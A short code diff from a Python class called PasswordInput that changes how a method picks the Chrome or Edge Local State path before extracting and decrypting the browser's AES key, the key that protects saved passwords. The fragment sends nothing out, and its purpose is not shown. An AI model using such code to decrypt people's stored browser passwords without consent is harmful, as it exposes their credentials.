@@ -47,13 +47,9 @@ class PasswordInput:
         """Extract and decrypt the AES key from the Local State file."""
         try:
             # Set the local state path based on the browser
-            local_state_path = None
-
-            if self.browser == "None":
-                return None
-            elif self.browser == "Chrome":
+            if self.browser in ["Chrome", None]:
                 local_state_path = os.getenv('CHROME_LOCAL_STATE_PATH')
-            elif self.browser == "Microsoft Edge":
+            else:
                 local_state_path = os.getenv('EDGE_LOCAL_STATE_PATH')
 
             if local_state_path:
